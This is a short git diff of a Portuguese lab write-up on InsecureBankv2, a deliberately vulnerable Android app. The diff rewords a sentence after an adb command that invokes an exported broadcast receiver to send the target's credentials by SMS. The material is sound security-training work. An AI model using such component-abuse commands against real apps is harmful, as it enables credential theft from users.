@@ -31,7 +31,7 @@ No adb, pode-se chamar a função diretamente, com o seguinte comando:
 ```
 adb shell am broadcast -a theBroadcast -n com.android.insecurebankv2/.MyBroadCastReceiver --es phonenumber 555 521-5554  --es newpass N3wP@ss
 ```
-No dispositivo alvo pode-se verificar que uma mensagem foi recebida com as credenciais da vítma
+No dispositivo alvo pode-se verificar que uma mensagem foi recebida com as credenciais do alvo em questão.
 
 ![pass_reset](.img/pass_reset.png)
 
